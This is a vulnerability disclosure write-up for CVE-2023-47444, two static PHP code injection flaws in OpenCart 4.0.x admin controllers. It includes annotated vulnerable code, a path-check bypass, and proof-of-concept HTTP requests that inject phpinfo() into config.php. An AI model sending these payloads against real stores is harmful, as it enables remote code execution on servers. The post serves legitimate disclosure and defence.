---
layout: post
title: "Static Code Injections in OpenCart (CVE-2023-47444)"
has_children: no
parent: "Disclosed vulnerabilities"
date: 2023-10-30
nav_order: 2023-10-30
reading_time: 11 min
screenshots: /assets/images/disclosures/opencart-rce-CVE-2023-47444/
tags: OpenCart code-injection php

twitter_text: Very short description for twitter 
description: A summary/assay for the article
---

{% include header-disclosures.html %}


{: .abstract }
>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having `common/security` "access" and "modify" privileges can write arbitrary untrusted data inside `config.php` and `admin/config.php`, resulting in remote code execution on the underlying server.

---

{% include TOC.md %}


## Summary

<dl>
  <dt>Product</dt>
  <dd><a href="https://github.com/opencart/opencart">OpenCart</a></dd>
  <dt>Vendor</dt>
  <dd><a href="https://www.opencart.com/index.php?route=common/home">OpenCart</a></dd>
  <dt>Severity</dt>
  <dd>High</dd>
  <dt>Affected Version(s)</dt>
  <dd>4.0.0.0 - 4.0.2.3</dd>
  <dt>Tested Version(s)</dt>
  <dd>4.0.2.2, 4.0.2.3</dd>
  <dt>CVE</dt>
  <dd>CVE-2023-47444</dd>
  <dt>CVE Description</dt>
  <dd>In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security "access" and "modify" privileges privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.</dd>
  <dt>CWE</dt>
  <dd><a href="https://cwe.mitre.org/data/definitions/96.html">CWE-96: Improper Neutralization of Directives in Statically Saved Code</a></dd>
</dl>

### CVSS 3.1 Score

**Base Score:** 8.8 (High)  
**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

|**Metric**|**Value**|
|---|---|
|**Attack Vector (AV)**|Network|
|**Attack Complexity (AC)**|Low|
|**Privileges Required (PR)**|Low|
|**User Interaction (UI)**|None|
|**Scope (S)**|Unchanged|
|**Confidentiality (C)**|High|
|**Integrity (I)**|High|
|**Availability (A)**|High|


# Vulnerabilities

There are two distinct static code injection vulnerabilities in the function that moves the `storage` folder outside the application web root, and the function that renames the secret `admin` path after the installation. While the latter can be exploited only if the `admin` folder has not yet been renamed, the former can be exploited anytime, even if the `storage` folder has already been moved. Both vulnerabilities require that the user has the `common/security` "access" and "modify" privileges enabled. Exploiting them, an authenticated adversary can inject arbitrary static PHP code that will be executed by every page, resulting in arbitrary remote code execution. Those vulnerabilities were both introduced from OpenCart 4.0.0.0 onward.

{: .warning }
>Because of the nature of the vulnerabilities, it is very likely to create disruption and break the application completely if the configuration files and the actual directories created on disk do not match at the end of exploitation.

## Vulnerabilities Details and Root Causes

### Static Code Injection in common/security.storage

{: .bug }
>The `storage()` function in `upload/admin/controller/common/security.php` is vulnerable to PHP static code injection because `$name` and `$path` user-controlled variables are concatenated and placed inside `$base_new`, which is then written inside the `config.php` and `admin/config.php` files, without proper escape or validation.

The relevant vulnerable code can be found below:

*4.0.2.3/upload/admin/controller/common/security.php*
```php
public function storage(): void {
    // ...
    if (isset($this->request->get["page"])) {
        $page = (int)$this->request->get["page"];
    } else {
        $page = 1;
    }
    if (isset($this->request->get["name"])) {
        $name = preg_replace( // [1]
            "[^a-zA-z0-9_]",
            "",
            basename(
                html_entity_decode(
                    trim($this->request->get["name"]), 
                    ENT_QUOTES,
                    "UTF-8"
                )
            )
        );
    } else {
        $name = "";
    }
    if (isset($this->request->get["path"])) {
        $path = preg_replace( // [2]
            "[^a-zA-z0-9_\:\/]",
            "",
            html_entity_decode(
                trim($this->request->get["path"]), 
                ENT_QUOTES,
                "UTF-8"
            )
        );
    } else {
        $path = "";
    }
    $json = [];
    if ($this->user->hasPermission("modify", "common/security")) {
        // ...
        $base_new = $path . $name . "/";
        // ...
        $root = str_replace("\\", "/", realpath($this->request->server["DOCUMENT_ROOT"] . "/../"));
        if (substr($base_new, 0, strlen($root)) != $root || $root == $base_new) { // [3]
            $json["error"] = $this->language->get("error_storage");
        }
        if (is_dir($base_new) && $page < 2) { // [4]
            $json["error"] = $this->language->get("error_storage_exists");
        }
        if (!is_writable(DIR_OPENCART . "config.php") || !is_writable(DIR_APPLICATION . "config.php")) {
            $json["error"] = $this->language->get("error_writable");
        }
    } else {
        $json["error"] = $this->language->get("error_permission");
    }
    if (!$json) {
        // ...
        // Create the new storage folder
        if (!is_dir($base_new)) {
            mkdir($base_new, 0777); // [5]
        }
        // ...
        for ($i = $start;$i < $end;$i++) {
            // moving all the files and directories from the old storage folder to the newer one
            // ...
            
        }
        if ($end < $total) {
            $json["next"] = $this->url->link(
                "common/security.storage",
                "&user_token=" .
                    $this->session->data["user_token"] .
                    "&name=" .
                    $name .
                    "&path=" .
                    $path .
                    "&page=" .
                    ($page + 1),
                true
            );
        } else {
            // Start deleting old storage location files and directories.
            // ...
            rmdir($base_old);
            // Modify the config files
            $files = [DIR_APPLICATION . "config.php", DIR_OPENCART . "config.php", ];
            foreach ($files as $file) {
                $output = "";
                $lines = file($file);
                foreach ($lines as $line_id => $line) {
                    if (strpos($line, 'define(\'DIR_STORAGE') !== false) {
                        $output.= 'define(\'DIR_STORAGE\', \'' . $base_new . '\');' . "\n"; // [6]
                        
                    } else {
                        $output.= $line;
                    }
                }
                $file = fopen($file, "w");
                fwrite($file, $output);
                fclose($file);
            }
            // ...
        }
    }
}
```
At `[1]` and `[2]`, the new storage directory's name and path are obtained from the incoming HTTP GET request and stored into `$name` and `$path` PHP variables. In both cases, a regex is applied in order to remove special untrusted characters, however, the regex is badly implemented and so does nothing. Furthermore, the `basename()` [^basename] function is used on the supplied `name` parameter, preventing us from using the `/` character inside it.

[^basename]: [`basename`](https://www.php.net/manual/en/function.basename.php), php.net

```php
$foo = "storage99');phpinfo();%23";
$name = preg_replace('[^a-zA-z0-9_]', '', basename(html_entity_decode(trim($foo), ENT_QUOTES, 'UTF-8')));

print($name); // storage99');phpinfo();%23
print("\n\n");

$name = preg_replace('/[^a-zA-z0-9_]/', '', basename(html_entity_decode(trim($foo), ENT_QUOTES, 'UTF-8')));

print($name); // storage99phpinfo23
print("\n\n");
```
At `[3]`, after having verified the authenticated user has the write privilege for `common/security`, some checks are performed on `$base_new` (which is the concatenation of `$name` and `$path`). Here the application checks that `$base_new` is located inside the OpenCart's installation folder, but the check is not well performed and (if required) can be bypassed using a path traversal:

```php
<?php

$root = str_replace('\\', '/', realpath('$this->request->server["DOCUMENT_ROOT"]' . '/../'));
print($root . "\n\n"); // /home/kali/Projects/OpenCart/4.0.2.3/

$base_new = '/dev/shm/new-folder'; // result -> Error!
$base_new = '/home/kali/Projects/new-folder'; // result -> Error!
$base_new = '/dev/shm/new-folder'; // result -> Error!
$base_new = '/home/kali/Projects/OpenCart/new-folder';  // result -> Error!
$base_new = '/home/kali/Projects/OpenCart/4.0.2.3/new-folder';  // result -> Accepted!
$base_new = '/home/kali/Projects/OpenCart/4.0.2.3/../../../../../../../../dev/shm/new-folder'; // result -> Accepted!

if ((substr($base_new, 0, strlen($root)) != $root) || ($root == $base_new)) {
  print("Error!");
}else{
  print("Accepted!");
}
?>
```

The OpenCart installation directory can be retrieved in many different ways. It can be leaked through the GUI (if the `storage` folder has never been moved), or through verbose errors (eg. CVE-2011-3763 [^3763]). It can also be read from logs if the user has the `tool/log` read privilege, or it can be discovered mis-using other funtionalities such as the change profile image [^1891].

[^3763]: [CVE-2011-3763](https://nvd.nist.gov/vuln/detail/CVE-2011-3763), nvd.nist.gov
[^1891]: [CVE-2013-1891](https://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-2935892), security.snyk.io

![path-disclosure]({{page.screenshots}}path-disclosure.png)
{: .text-center }

At `[4]`, the application checks that `$base_new` does not already exist and `config.php` and `admin/config.php` have writable privileges.
If no error has occurred, the application creates the new folder `[5]` and moves all the files from the old `storage` path to the newer one.<br>
Finally, at `[6]`, it replaces inside `config.php` and `admin/config.php` the old `DIR_STORAGE` value with the newer one, without performing any further checks on the variable.

In a normal scenario, the storage directory will be moved to a newer location under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject a new storage path inside configuration files containing special characters that allow escaping the `define()` function and add arbitrary PHP code.

*4.0.2.3/upload/admin/config.php*
```php
// Default DIR_STORAGE value
define('DIR_STORAGE', DIR_SYSTEM . 'storage/');

// DIR_STORAGE after a legitimate move
define('DIR_STORAGE', '/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/');

// DIR_STORAGE after the exploitation
define('DIR_STORAGE', '/home/kali/Projects/OpenCart/4.0.2.3/storage-bis/');phpinfo();#');
```

### Static Code Injection in common/security.admin

{: .bug }
>The `admin()` function in `upload/admin/controller/common/security.php` is vulnerable to PHP static code injection because `$name` user-controlled variable is placed inside `$base_new`, which is then written inside a new `config.php` file, without proper escape or validation.

The relevant vulnerable code can be found below:

```php
public function admin(): void {
    // ...
    if (isset($this->request->get['name'])) { // [1]
        $name = preg_replace(
            '[^a-zA-z0-9]', 
            '', 
            basename(
                html_entity_decode(
                    trim((string)$this->request->get['name']), 
                    ENT_QUOTES, 
                    'UTF-8'
                )
            )
        );
    } else {
        $name = 'admin';
    }

    $json = [];

    if ($this->user->hasPermission('modify', 'common/security')) {
        $base_old = DIR_OPENCART . 'admin/'; 
        $base_new = DIR_OPENCART . $name . '/';

        if (!is_dir($base_old)) { // [2]
            $json['error'] = $this->language->get('error_admin');
        }

        if (is_dir($base_new) && $page < 2) {
            $json['error'] = $this->language->get('error_admin_exists');
        }

        if ($name == 'admin') {
            $json['error'] = $this->language->get('error_admin_name');
        }

        if (!is_writable(DIR_OPENCART . 'config.php') || !is_writable(DIR_APPLICATION . 'config.php')) {
            $json['error'] = $this->language->get('error_writable');
        }
    } else {
        $json['error'] = $this->language->get('error_permission');
    }

    if (!$json) {
        // ...
        // 1.  We need to copy the files, as rename cannot be used on any directory, 
        //     the executing script is running under
        // ...
        // 2. Create the new admin folder name
        if (!is_dir($base_new)) { // [3]
            mkdir($base_new, 0777);
        }
        // 3. split the file copies into chunks.
        // ...
        // 4. Copy the files across
        foreach (array_slice($files, $start, $end) as $file) {
            // ...
        }

        if (($page * $limit) <= $total) {
            $json['next'] = $this->url->link(
                'common/security.admin',
                '&user_token=' . $this->session->data['user_token'] . 
                '&name=' . $name . 
                '&page=' . ($page + 1),
                true
            );
        } else {
            // Update the old config files
            $file = $base_new . 'config.php';
            $output = '';
            $lines = file($file);

            foreach ($lines as $line_id => $line) {
                $status = true;

                if (strpos($line, 'define(\'HTTP_SERVER') !== false) {
                    $output .= 'define(\'HTTP_SERVER\', \'' . // [4]
                    substr( 
                        HTTP_SERVER, 
                        0, 
                        strrpos(HTTP_SERVER, '/admin/')
                        ) . '/' . $name . '/\');' . "\n"; 
                    $status = false;
                }

                if (strpos($line, 'define(\'DIR_APPLICATION') !== false) {
                    $output .= 'define(\'DIR_APPLICATION\', DIR_OPENCART . \'' . $name . // [5]
                    '/\');' . "\n"; 
                    $status = false;
                }

                if ($status) {
                    $output .= $line;
                }
            }
            // ...
        }
    }
    // ...
}
```

At `[1]` the new admin directory name is read from the incoming HTTP GET request and stored inside the `$name` PHP variable. Also in this case, a regex is applied in order to remove special untrusted characters, but it is badly implemented and so does nothing. As for the `storage()` function, also in this case `basename()` [^basename] is used on the supplied `name` parameter, preventing us from using the `/` character inside it. <br>

[^basename]: [`basename`](https://www.php.net/manual/en/function.basename.php), php.net

At `[2]`, after having verified the authenticated user has the write privilege for `common/security`, the application checks if the `admin/` or the new folder exists and also that `config.php` and `admin/config.php` have writable privileges. If no error has occurrs, the application creates the new folder `[3]` and moves all the files from the old admin path to the newer one.

Finally, at `[4]` and `[5]`, it replaces inside the new `config.php` the old `HTTP_SERVER` and `DIR_APPLICATION` variables with the new path, without performing any further checks on the variables.

In a normal scenario, the `admin/` directory will be moved to a newer directory under the OpenCart installation folder, and the configuration files will be updated accordingly. However, since there is a lack of input sanitization, it is possible to inject two new `HTTP_SERVER` and `DIR_APPLICATION` paths inside the configuration file containing special characters that allow escaping the `define()` function and add arbitrary PHP code.

## Exploit Conditions and Prerequisites

Both the vulnerabilities can be exploited if the attacker has valid credentials for the backend dashboard with the `write` permission on `common/security`.
Furthermore, an additional pre-requisite is needed to exploit the `admin()` function (`common/security.admin`), whereby the `admin/` folder must be the default one and must not have been previously renamed.

## Proof-of-Concept

{: .note }
>A full automated exploit is still under developement and will be released soon.

### PoC for common/security.storage

The vulnerability in `common/security.storage` can be exploited by sending two GET requests.

{: .danger }
>The PoC do not fix the mismatch between the `DIR_STORAGE` variable written inside `config.php` and the actual folder created on disk (`/home/kali/Projects/OpenCart/4.0.2.3/pwned'\'');phpinfo();#`). This means that **the PoC completely breaks the application**. Be aware of this.

The first request has to be sent to: `route=common/security.storage&name=pwned');phpinfo();%23&path=/home/kali/Projects/OpenCart/4.0.2.3/&user_token=<user_token>`

```http
GET /admin_secret/index.php?route=common/security.storage&name=pwned');phpinfo();%23&path=/home/kali/Projects/OpenCart/4.0.2.3/&user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad HTTP/1.1
Host: 127.0.0.1:8888
Cookie: OCSESSID=fbc47c7e5098550f0c12070be0

--- RESPONSE ---

HTTP/1.1 200 OK

{"next":"http:\/\/127.0.0.1:8888\/admin_secret\/index.php?route=common\/security.storage&user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&name=pwned');phpinfo();#&path=\/home\/kali\/Projects\/OpenCart\/4.0.2.3\/&page=2"}
```

The second one to: `route=common/security.storage&name=pwned');phpinfo();%23&path=/home/kali/Projects/OpenCart/4.0.2.3/&user_token=<user_token>&page=99`

```http
GET /admin_secret/index.php?route=common/security.storage&name=pwned');phpinfo();%23&path=/home/kali/Projects/OpenCart/4.0.2.3/&user_token=e5e8e0f6369ef124dd3d94d4d4e1d8ad&page=99 HTTP/1.1
Host: 127.0.0.1:8888
Cookie: OCSESSID=fbc47c7e5098550f0c12070be0

--- RESPONSE ---

HTTP/1.1 200 OK

{"success":"Success: Storage directory has been moved!"}
```

Now every page will include the poisoned `config.php` file, executing the injected code (in our case the `phpinfo()` function):

![storage-rce]({{page.screenshots}}storage-rce.png)
{: .text-center }

**Demo**:

<iframe width="560" height="315" src="https://www.youtube.com/embed/auTky_gm8Rk?si=kLfSwbpxzarV5N94" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

### PoC for common/security.admin

The vulnerability in `common/security.admin` can also be exploited by sending two different GET requests.

The first one to: `route=common/security.admin&user_token=<token>&page=1&name=foo%27);phpinfo();print(%27`

```http
GET /admin/index.php?route=common/security.admin&user_token=7cc69dfa3112eb181c75da78147d8af1&page=1&name=foo%27);phpinfo();print(%27 HTTP/1.1
Host: 127.0.0.1:8888
Cookie: OCSESSID=fbc47c7e5098550f0c12070be0

--- RESPONSE ---

HTTP/1.1 200 OK

{"next":"http:\/\/127.0.0.1:8888\/admin\/index.php?route=common\/security.admin&user_token=7cc69dfa3112eb181c75da78147d8af1&name=foo');phpinfo();print('&page=2"}
```

The second one to: `route=common/security.admin&user_token=<token>&page=99&name=foo%27);phpinfo();print(%27`

```http
GET /admin/index.php?route=common/security.admin&user_token=7cc69dfa3112eb181c75da78147d8af1&page=99&name=foo%27);phpinfo();print(%27 HTTP/1.1
Host: 127.0.0.1:8888
Cookie: OCSESSID=fbc47c7e5098550f0c12070be0

--- RESPONSE ---

HTTP/1.1 200 OK

{"redirect":"http:\/\/127.0.0.1:8888\/foo');phpinfo();print('\/index.php?route=common\/login"}

```

In this case, a new directory containing the poinsoned `config.php` file will be created:

![admin-rce]({{page.screenshots}}admin-rce.png)
{: .text-center }

**Demo**:

<iframe width="560" height="315" src="https://www.youtube.com/embed/6if6Kfsb2oM?si=kLfSwbpxzarV5N94" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## Disclosure Timeline
> *Please refer to the <a href="{{site.url}}/disclosures/policy/">disclosure policy</a> page for further details about the disclosure policy adopted by 0xbro.*<br>

- **14/10/2023**: Discovered both the vulnerabilities in `opencart/upload/admin/controller/common/security.php`<br>
- **17/10/2023**: Contacted OpenCart at `support@opencart.com` (without receiving any response).<br>
- **24/10/2023**: Contacted OpenCart at `webmaster@opencart.com`.<br>
- **30/10/2023**: Following the official [guidelines](https://github.com/opencart/opencart#reporting-a-bug), published a [post](https://forum.opencart.com/viewtopic.php?t=232348) on the official OpenCart forum.<br>
- **02/11/2023**: Sent a PM to an Administrator on the official OpenCart forum.<br>
- **10/11/2023**: Assigned [CVE-2023-47444](https://www.cve.org/CVERecord?id=CVE-2023-47444)
- **10/11/2023**: Sent a PM to another Administrator on the official OpenCart forum as a very last resort to contact the OpenCart staff.<br>
- **11/11/2023**: Get a *kindly* response from an OpenCart Administrator
![email]({{page.screenshots}}email.png){: width="550" }
- **11/11/2023**: Public release and opened a GitHub issue



{% include share.html %}